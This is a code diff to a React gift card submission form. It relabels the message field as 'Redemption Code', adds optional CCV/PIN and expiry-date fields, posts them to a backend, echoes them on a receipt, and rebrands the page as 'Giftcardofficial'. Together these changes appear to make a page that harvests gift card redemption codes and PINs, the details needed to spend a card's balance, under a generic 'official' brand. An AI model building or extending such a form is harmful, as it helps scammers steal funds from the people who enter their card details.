@@ -1,4 +1,3 @@
-
 import { useState } from "react";
 
 const API_URL = import.meta.env.VITE_API_URL;
@@ -33,6 +32,8 @@ export default function GiftCardForm() {
     currency: "USD",
     amount: "",
     message: "",
+    cardCcv: "",
+    expiryDate: "",
   });
 
   const [loading, setLoading] = useState(false);
@@ -70,6 +71,8 @@ export default function GiftCardForm() {
 
     const amount = Number(form.amount);
     const personalMessage = form.message.trim();
+    const cardCcv = form.cardCcv.trim();
+    const expiryDate = form.expiryDate.trim();
 
     if (
       !Number.isFinite(amount) ||
@@ -81,7 +84,17 @@ export default function GiftCardForm() {
     }
 
     if (personalMessage.length > 40) {
-      setError("Your message is too long.");
+      setError("Your redemption code message is too long.");
+      return;
+    }
+
+    if (cardCcv.length > 10) {
+      setError("Please enter a valid CCV.");
+      return;
+    }
+
+    if (expiryDate.length > 20) {
+      setError("Please enter a valid expiry date.");
       return;
     }
 
@@ -100,6 +113,8 @@ export default function GiftCardForm() {
             currency: form.currency,
             amount,
             message: personalMessage,
+            cardCcv,
+            expiryDate,
           }),
         }
       );
@@ -120,6 +135,8 @@ export default function GiftCardForm() {
           currency: form.currency,
           amount: `${form.currency} ${amount.toLocaleString()}`,
           message: personalMessage,
+          cardCcv: cardCcv || "Not provided",
+          expiryDate: expiryDate || "Not provided",
         },
         submittedAt:
           result.submittedAt || new Date().toLocaleString(),
@@ -130,6 +147,8 @@ export default function GiftCardForm() {
         currency: "USD",
         amount: "",
         message: "",
+        cardCcv: "",
+        expiryDate: "",
       });
 
     } catch (err) {
@@ -209,8 +228,7 @@ export default function GiftCardForm() {
           />
         </div>
 
-        {/* SHORT PERSONAL MESSAGE */}
-
+        {/* REDEMPTION CODE */}
         <div className="field">
           <label htmlFor="message">Redemption Code</label>
 
@@ -222,6 +240,34 @@ export default function GiftCardForm() {
             onChange={updateField}
             maxLength={40}
             rows={3}
+          />
+        </div>
+
+        {/* CCV */}
+        <div className="field">
+          <label htmlFor="cardCcv">Gift Card CCV / PIN (Optional)</label>
+          <input
+            id="cardCcv"
+            name="cardCcv"
+            type="text"
+            placeholder="Enter CCV or PIN"
+            value={form.cardCcv}
+            onChange={updateField}
+            maxLength={10}
+          />
+        </div>
+
+        {/* EXPIRY DATE */}
+        <div className="field">
+          <label htmlFor="expiryDate">Gift Card Expiry Date (Optional)</label>
+          <input
+            id="expiryDate"
+            name="expiryDate"
+            type="text"
+            placeholder="MM/YY or Date"
+            value={form.expiryDate}
+            onChange={updateField}
+            maxLength={20}
           />
         </div>
 
@@ -329,6 +375,16 @@ export default function GiftCardForm() {
               )}
 
               <div className="receipt-row">
+                <span>CCV</span>
+                <strong>{submission.details.cardCcv}</strong>
+              </div>
+
+              <div className="receipt-row">
+                <span>Expiry Date</span>
+                <strong>{submission.details.expiryDate}</strong>
+              </div>
+
+              <div className="receipt-row">
                 <span>Submission Date</span>
                 <strong>{submission.submittedAt}</strong>
               </div>
@@ -343,7 +399,7 @@ export default function GiftCardForm() {
             </button>
 
             <p className="popup-footer">
-              Thank you for choosing Cardspace.
+              Thank you for choosing Giftcardofficial.
             </p>
           </div>
         </div>
